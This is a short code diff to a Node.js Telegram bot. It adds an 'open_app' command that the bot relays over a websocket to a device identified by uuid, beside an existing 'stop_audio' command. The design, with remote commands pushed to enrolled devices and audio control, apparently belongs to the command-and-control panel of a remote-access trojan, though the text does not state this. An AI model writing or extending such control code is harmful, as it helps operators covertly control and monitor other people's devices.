@@ -628,6 +628,17 @@ appBot.on("callback_query", (callbackQuery) => {
             }
         )
     }
+    if (commend == 'open_app') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('open_app');
+            }
+        });
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨'
+        )
+    }
     if (commend == 'stop_audio') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
